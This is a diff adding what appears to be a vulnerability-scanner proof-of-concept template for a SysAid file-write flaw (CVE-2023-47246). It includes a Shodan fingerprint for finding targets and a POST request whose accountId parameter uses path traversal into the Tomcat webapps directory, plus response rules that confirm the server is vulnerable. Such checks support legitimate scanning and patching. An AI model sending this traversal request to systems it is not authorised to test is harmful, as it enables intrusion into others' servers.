@@ -1,0 +1,25 @@
+id: poc-yaml-sysaid-server-anyfile-upload
+info:
+  name: SysAid 文件写入漏洞(CVE-2023-47246)
+  severity: critical
+  tags:
+  - CVE-2023-47246
+  - 两高一弱
+  finger: sysaid_on-premises
+  shodan: icon_hash="1540720428"
+requests:
+- method: POST
+  path: /userentry?accountId=/../../../tomcat/webapps/fdafs/&symbolName=test&base64UserName=YWRtaW4=
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: jjj
+  expression: 'status_code == 500
+
+    && contains(body,"java.io.EOFException: Unexpected end of ZLIB input stream")
+
+    && contains(body,"The full stack trace of the root cause is available in the server
+    logs")
+
+    '
+variables: {}
+transport: http
